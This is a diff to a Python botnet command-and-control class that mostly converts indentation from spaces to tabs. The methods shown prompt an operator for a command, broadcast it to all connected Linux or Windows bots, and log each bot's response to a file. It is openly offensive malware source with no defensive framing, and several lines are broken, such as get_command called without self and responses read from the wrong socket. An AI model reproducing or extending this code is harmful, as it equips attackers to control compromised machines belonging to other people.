@@ -60,22 +60,21 @@ class BotnetCmdCtrl:
 				self.linux_connections[addr[1]] = conn
 
 			self.server_socket = sock # Set the instance socket to the connection socket we establisehd with our client.
-    
-    def get_command(self):
-        """This function gets a command from the user.
-        
-            Arguments:
+	def get_command(self):
+		"""This function gets a command from the user.
+		
+			Arguments:
                 None
             
             Returns:
                 The command that was provided by the user.
         """
-        command = input(GREEN, 'Command $: ', RESET) # Prompt user for command to send to entire botnet.
-        return command # Return command specified.
-        
+		command = input(GREEN, 'Command $: ', RESET) # Prompt user for command to send to entire botnet.
+		return command # Return command specified.
+	
 	def send_cmd_all_linux(self):
 		"""This function will send the command to all linux bots in the botnet.
-
+		
 			Arguments:
 				None
 
@@ -84,26 +83,25 @@ class BotnetCmdCtrl:
 		"""
 		command = get_command()
 		for ip, conn in self.linux_connections.items():
-		    conn.send(command)
+			conn.send(command)
 			response = self.sock.recv(10000).decode('utf-8') # Store response received from executed command.
 			self.write_response_output(response, ip) # Write response to file.
 			
 	def send_cmd_all_windows(self):
-	    """This function sends a command to all windows bots in the botnet.
+		"""This function sends a command to all windows bots in the botnet.
 	    
-	        Arguments:
-	            None
+			Arguments:
+				None
 	       
-	        Returns:
+		   	Returns:
 	            None
 	    """
-        command = get_command()
-	    for ip, conn in self.windows_connections.items():
-		    conn.send(command)
-		    response = self.sock.recv(10000).decode('utf-8')
-		    self.write_response_output(response, ip)
+		command = get_command()
+		for ip, conn in self.windows_connections.items():
+			conn.send(command)
+			response = self.sock.recv(10000).decode('utf-8')
+			self.write_response_output(response, ip)
 			
-	
 	def send_cmd_specific(self):
 		"""This function will send a command to specific IP addresses.
 
